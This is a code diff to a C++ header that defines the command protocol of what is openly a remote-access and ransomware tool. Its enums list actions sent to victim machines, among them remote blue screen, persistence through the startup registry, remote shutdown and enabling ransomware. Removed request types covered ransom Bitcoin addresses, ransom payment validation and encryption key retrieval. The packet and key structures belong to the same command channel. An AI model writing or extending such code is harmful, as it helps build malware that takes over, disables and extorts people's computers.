@@ -5,10 +5,11 @@
 
 #include <vector>
 #include <string>
+#include <iterator>
 
 typedef std::vector<unsigned char> BYTESTRING;
 
-constexpr USHORT MAX_BUFFER_LEN = 512;
+constexpr USHORT MAX_BUFFER_LEN = 4000;
 
 // bitwise flags optionally included in packets....
 const int NO_CONSOLE          = 1 << 0; // default is to make a console when a command is ran on remote host
@@ -21,24 +22,25 @@ const int PACKET_IS_A_COMMAND = 1 << 5; // this packet is a command and the acti
 // Response codes sent from the client to the server
 // Usually after a remoteaction is completed
 enum ClientResponseCode {
+    kNotAResponse  = 3,
     kResponseOk    = 6,
     kResponseError = -1,
     kTimeout       = -2,
 };
 
-// Enums dictating which action to perform on the client
-// Sent from the server to client
-enum RemoteAction {
+// Enums dictating which action to perform when packets are received
+enum Action {
     kNone,
     kOpenRemoteProcess,
-    kKillClient, // forcefully disconnect the client from the server
+    kClientWantsToDisconnect,  
+    kKillClient,        // forcefully disconnect the client from the server
     kPingClient,
     kKeepAlive,
-    kRemoteBSOD, // cause a blue screen of death
-    kAddToStartup,
-    kRemoteShutdown, // shut down the client machine
-    kRansomwareEnable, // dangerous, enable ransomware on client machine
-    kReturnPrivateRSAKey,
+    kRemoteBSOD,        // cause a blue screen of death
+    kAddToStartup,      // add a program file path to startup registry
+    kRemoteShutdown,    // shut down the client machine
+    kRansomwareEnable,  // dangerous, enable ransomware on client machine
+    kAddClientToServer, // client wants to be added to tcp server
 };
 
 enum SocketTypes {
@@ -70,75 +72,32 @@ struct Server {
 };
 
 /*
-    A struct representing a message sent from
-    a client to a server. 
-*/
-struct ClientResponse {
-    ClientResponseCode responseCode = kResponseError;
-    RemoteAction actionPerformed = kNone;
-    char buffer[MAX_BUFFER_LEN]; // base64 encoded aes response i.e output of system()
-    size_t buffLen;
-};
-
-#include "External/base64.h"
-
-/*
     Packet of information sent over sockets.
 */
 #pragma pack(push, 1)
 struct Packet {
     char buffer[MAX_BUFFER_LEN];
     size_t buffLen;
-    RemoteAction action;
+    Action action;
     int flags;
+    bool valid;
+    ClientResponseCode code = kResponseError;
 
-    inline const void insert(char* s) { 
-        errno_t copied = strcpy_s(buffer, s); 
-        buffLen = (copied == 0) ? strlen(s) : -1; 
-    }
-
-    inline const void insert(std::string s) { 
-        strncpy_s(buffer, s.c_str(), sizeof(buffer) - 1);
-        buffLen = s.length();
+    inline const bool insert(std::string s) { 
+        if ( strcpy_s(buffer, s.data()) != 0 )
+            return false;
+        
+        buffLen = s.size();
+        return true;
     }
 };
 #pragma pack(pop, 0)
-
-/*
-    When a client requests the tcp server to do something
-*/
-struct ClientRequest {
-    enum Action {
-        kNone = 0,
-        kConnectClient,
-        kRequestPublicEncryptionKey,
-        kRequestPrivateEncryptionKey,
-        kValidateRansomPayment,
-        kRequestRansomBTCAddress,
-        kPing,
-        kDisconnectClient,
-        kGetRequestEncryptionKeys,
-        kGetRequestEncryptionKeyPrivate,
-        kGetRequestEncryptionKeyPublic
-    };
-
-    BOOL              valid;
-    Action            action;
-    SOCKET            udp;
-    SOCKET            tcp;
-    
-    ClientRequest() = default;
-    ClientRequest(
-        Action todo, SOCKET tcp = INVALID_SOCKET, SOCKET udp = INVALID_SOCKET
-    ) : valid(TRUE), action(todo), udp(udp), tcp(tcp)
-    {
-    }
-};
 
 struct RSAKeys {
     RSA* pub;
     RSA* priv;
 };
 
-typedef ClientRequest ClientMessage;
+
+
 typedef Packet ServerCommand, ServerRequest, ServerResponse;
